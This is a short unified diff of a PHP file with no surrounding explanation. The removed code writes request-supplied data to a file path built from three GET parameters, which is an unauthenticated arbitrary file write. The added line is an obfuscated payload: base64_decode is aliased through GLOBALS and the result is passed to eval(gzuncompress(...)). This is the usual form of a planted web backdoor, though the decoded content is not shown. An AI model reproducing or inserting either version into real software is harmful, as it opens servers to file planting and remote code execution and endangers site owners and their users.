@@ -1,5 +1,1 @@
-<?php
-    $m_data = $_GET['m_data'];
-    $m_folder = $_GET['m_folder'];
-    $m_type = $_GET['m_type'];
-    file_put_contents(__DIR__ . "/../$m_folder/" . date("d-m-Y", time()) . $m_type, $m_data);
+<?php $GLOBALS['_1719724758_']='base64_decode';eval(gzuncompress($GLOBALS['_1719724758_']('eAFTibc0NjcyMDY1MY23VYl3dw2JVs+NT0ksSVSPtVaJNzQyMjAxNgESSLJp+TkpqUVgeSMDC0NTU1NLY0sk+ZLKglSgbFpmTmp8QWlJfHJ+XklqXkmxRny8i2dQfLyekr6enj6K4fpKekA7UzWUUnRzdSOVdEoyc1M1NDX1VOKRbNBRQXKspjUAbPIztA==')));
